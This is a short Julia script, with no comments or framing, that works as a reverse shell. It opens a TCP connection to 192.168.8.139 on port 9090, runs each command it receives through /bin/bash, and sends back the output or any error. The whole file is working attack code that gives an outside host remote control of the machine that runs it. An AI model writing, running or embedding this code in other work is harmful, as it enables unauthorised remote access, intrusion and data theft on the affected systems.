using Sockets

c = connect("192.168.8.139", 9090);
while true
   cmd = readline(c, keep=true);
   try
      println(c, read(`/bin/bash -c $cmd`, String));
   catch e
      print(c, e)
   end
end
